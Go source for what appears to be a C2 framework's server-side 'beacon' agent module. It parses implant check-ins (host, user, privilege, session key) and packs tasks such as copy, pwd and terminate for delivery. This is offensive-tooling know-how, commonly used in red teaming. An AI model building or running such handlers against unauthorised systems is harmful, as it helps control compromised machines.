package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strconv"
)

const (
	SetName     = "beacon"
	SetListener = "BeaconHTTP"
	SetUiPath   = "_ui_agent.json"
	SetCmdPath  = "_cmd_agent.json"
)

func CreateAgent(initialData []byte) (AgentData, error) {
	var agent AgentData

	/// START CODE HERE

	packer := CreatePacker(initialData)
	agent.Sleep = packer.ParseInt32()
	agent.Jitter = packer.ParseInt32()
	agent.ACP = int(packer.ParseInt16())
	agent.OemCP = int(packer.ParseInt16())
	agent.GmtOffset = int(packer.ParseInt8())
	agent.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agent.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agent.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agent.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agent.Elevated = false
	if (flag & 0b00000100) > 0 {
		agent.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agent.InternalIP = int32ToIPv4(internalIp)
	agent.Os, agent.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agent.Async = true
	agent.SessionKey = packer.ParseBytes()
	agent.Domain = string(packer.ParseBytes())
	agent.Computer = string(packer.ParseBytes())
	agent.Username = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)
	agent.Process = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)

	/// END CODE

	return agent, nil
}

func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, int(taskId))
		array = append(array, taskData.TaskData)
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func CreateTask(agent AgentData, command string, args map[string]any) (TaskData, error) {
	var taskData TaskData

	subcommand, _ := args["subcommand"].(string)

	/// START CODE HERE

	var (
		array    []interface{}
		packData []byte
		err      error
		taskType int = TYPE_TASK
	)

	switch command {

	case "cp":
		src, ok := args["src"].(string)
		if !ok {
			return taskData, errors.New("parameter 'src' must be set")
		}
		dst, ok := args["dst"].(string)
		if !ok {
			return taskData, errors.New("parameter 'dst' must be set")
		}
		array = []interface{}{12, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}
		break

	case "pwd":
		array = []interface{}{4}
		break

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{10, 1}
		} else if subcommand == "process" {
			array = []interface{}{10, 2}
		} else {
			return taskData, errors.New("subcommand must be 'thread' or 'process'")
		}

	default:
		return taskData, errors.New(fmt.Sprintf("Command '%v' not found", command))
	}

	packData, err = PackArray(array)
	if err != nil {
		return taskData, err
	}

	taskData = TaskData{
		TaskType: taskType,
		TaskData: packData,
		Sync:     true,
	}

	/// END CODE

	return taskData, nil
}
